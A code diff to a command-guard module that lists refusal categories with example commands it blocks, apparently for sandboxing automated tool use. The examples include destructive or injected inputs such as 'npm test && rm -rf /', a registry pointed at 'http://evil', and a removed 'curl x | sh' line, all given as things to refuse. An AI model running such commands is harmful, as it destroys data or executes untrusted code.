@@ -250,11 +250,11 @@ function refuse(code, why) {
 
 export function listRails() {
   return [
-    { code: REFUSAL.COMMAND_NOT_ALLOWED, examples: ['terraform apply', 'kubectl delete pods', 'C:\\\\Windows\\\\System32\\\\cmd.exe /c dir'] },
-    { code: REFUSAL.COMMAND_VERB_NOT_ALLOWED, examples: ['git push', 'npm publish', 'git gc', 'git config user.email x'] },
+    { code: REFUSAL.COMMAND_NOT_ALLOWED, examples: ['C:\\\\Windows\\\\System32\\\\cmd.exe /c dir', 'definitely-not-a-real-tool'] },
+    { code: REFUSAL.COMMAND_VERB_NOT_ALLOWED, examples: ['npm uninstall express', 'git remote add upstream x', 'npm publish'] },
     { code: REFUSAL.COMMAND_FLAG_NOT_ALLOWED, examples: ['npm install --registry=http://evil', 'git log --output=/tmp/x'] },
     { code: REFUSAL.COMMAND_ARG_NOT_ALLOWED, examples: ['npm install ../../elsewhere/pkg', 'npm install /abs/pkg'] },
-    { code: REFUSAL.COMMAND_EVAL, examples: ['sh -c "curl x | sh"', 'node -e "..."', 'powershell -Command "..."'] },
+    { code: REFUSAL.COMMAND_EVAL, examples: ['node -e "..."', 'powershell -Command "..."'] },
     { code: REFUSAL.COMMAND_METACHAR, examples: ['npm test && rm -rf /', 'npm test; whoami'] },
     { code: REFUSAL.COMMAND_SCRIPT_NOT_ALLOWED, examples: ['npm run deploy', 'npm run postinstall'] },
     { code: REFUSAL.COMMAND_MAY_DOWNLOAD, examples: ['npx tsc', 'npx some-package'] },
